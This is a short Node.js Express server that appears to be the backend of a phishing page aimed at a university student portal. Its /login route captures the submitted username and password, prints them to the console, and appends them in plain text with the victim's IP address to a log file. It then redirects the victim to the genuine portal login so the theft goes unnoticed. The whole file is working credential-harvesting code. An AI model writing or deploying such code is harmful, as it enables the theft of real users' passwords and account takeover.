var express = require("express");
var app = express();
var bodyParser = require("body-parser")
var fs = require('fs')
app.set("view engine", "ejs");
app.use(bodyParser.urlencoded({ extended: true }));

app.post('/login', (req, res)=>{
    console.log("hisadat");
    //console.log("hostmane is ",req.hostname);
    console.log("protocol:  ",req.protocol);
    console.log("url hit is ",req.originalUrl);
    console.log("route is ",req.route);
    console.log("Source ip is ",req.ip);
    
    console.log("user id is",req.body.uname)
    console.log("password is",req.body.passwd);
    //console.log(req.body)
    //var origin = req.get('origin')
    //console.log("origin ", req.header('Origin'))
    //console.log(req.)
    var txt = "\nUser id: " + req.body.uname + " Password: " + req.body.passwd + " Protocol: " + req.protocol
        + " URL hit: " + req.originalUrl  + " Source IP: " + req.ip
    txt += "\n\n -------------------------------------------------------------------------------"

    fs.appendFile('log.txt', txt , function (err) {
        if (err) throw err;
        console.log('Updated!');
      });
    res.redirect("https://vtop.vit.ac.in/vtop/initialProcess");
    //res.render("vtoperr");
})

app.listen(8080,(req, res)=>{
    console.log("listening")
})